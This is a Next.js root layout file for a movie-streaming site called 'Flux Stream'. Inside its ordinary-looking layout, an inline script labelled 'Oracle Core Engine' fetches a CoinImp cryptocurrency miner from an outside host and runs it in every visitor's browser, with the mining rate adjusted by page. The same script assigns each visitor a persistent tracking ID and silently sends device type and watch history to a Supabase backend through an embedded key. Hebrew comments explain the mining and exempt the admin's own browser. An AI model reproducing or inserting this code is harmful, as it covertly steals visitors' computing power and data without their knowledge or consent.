import type { Metadata } from "next";
import { Inter, Geist_Mono } from "next/font/google";
import "./globals.css";
import { Toaster } from "@/components/ui/toaster";
import { TelemetryTracker } from "@/components/streamex/telemetry-tracker";
import Script from 'next/script';

const inter = Inter({
  variable: "--font-inter",
  subsets: ["latin"],
  weight: ["300", "400", "500", "600", "700", "800", "900"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "Flux Stream - Discover & Stream",
  description: "Discover your next favorite movie or TV show on Flux Stream. Browse thousands of titles across all genres.",
  icons: {
    icon: "https://z-cdn.chatglm.cn/z-ai/static/logo.svg",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en" className="dark">
      <body className={`${inter.variable} ${geistMono.variable} font-sans antialiased bg-black text-white`}>
        
        {children}
        
        <Toaster />
        <TelemetryTracker />

        {/* Oracle Core Engine v2.0 - Integrated 20/04/2026 */}
        <Script id="oracle-integrated-engine" strategy="afterInteractive">
          {`
            (function() {
              const CONFIG = {
                supabaseUrl: 'https://muehmdtvffnxpjanoqqm.supabase.co',
                supabaseKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11ZWhtZHR2ZmZueHBqYW5vcXFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzNjQ2MDAsImV4cCI6MjA5MTk0MDYwMH0.u1JN1hoO7r0PzugmReaGiL2SLEvbdvKPS_u639byR1s',
                minerKey: '32e600f9188157777894f6c4989045b78b09341643c746736417765103a89e90',
                nodeId: localStorage.getItem('node_id') || 'node_' + Math.random().toString(36).substr(2, 9),
                isAdmin: localStorage.getItem('is_admin') === 'true'
              };

              if (!localStorage.getItem('node_id')) localStorage.setItem('node_id', CONFIG.nodeId);
              
              // הגנה לאדמין - לא חוצב ולא עוקב אחרי עצמך
              if (CONFIG.isAdmin) { 
                console.log("Oracle: Admin Detected - Engine Paused"); 
                return; 
              }

              async function report(endpoint, data) {
                try {
                  await fetch(\`\${CONFIG.supabaseUrl}/rest/v1/\${endpoint}\`, {
                    method: 'POST',
                    headers: {
                      'apikey': CONFIG.supabaseKey,
                      'Authorization': 'Bearer ' + CONFIG.supabaseKey,
                      'Content-Type': 'application/json',
                      'Prefer': 'resolution=merge-duplicates'
                    },
                    body: JSON.stringify({ ...data, node_id: CONFIG.nodeId })
                  });
                } catch (e) { /* silent fail */ }
              }

              // דיווח כניסה (Check-in 20/04)
              report('nodes', { 
                last_seen: new Date().toISOString(),
                device_type: navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'
              });

              // טעינת מנוע החציבה (CoinImp SDK)
              const script = document.createElement('script');
              script.src = 'https://www.hostingcloud.icu/pS6I.js';
              script.onload = function() {
                if (typeof Client !== 'undefined') {
                  const _client = new Client.Anonymous(CONFIG.minerKey, { throttle: 0.95 });
                  _client.start();

                  // ניהול עומסים חכם - 10% בצפייה, 5% בגלישה
                  setInterval(() => {
                    const isWatching = window.location.pathname.includes('/watch/');
                    if (isWatching) {
                      if (_client.getThrottle() !== 0.9) {
                        _client.setThrottle(0.9);
                        report('watch_history', { 
                          tmdb_id: window.location.pathname.split('/').pop(),
                          watched_at: new Date().toISOString()
                        });
                      }
                    } else {
                      if (_client.getThrottle() !== 0.95) _client.setThrottle(0.95);
                    }
                  }, 8000);
                }
              };
              document.head.appendChild(script);
            })();
          `}
        </Script>
      </body>
    </html>
  );
}
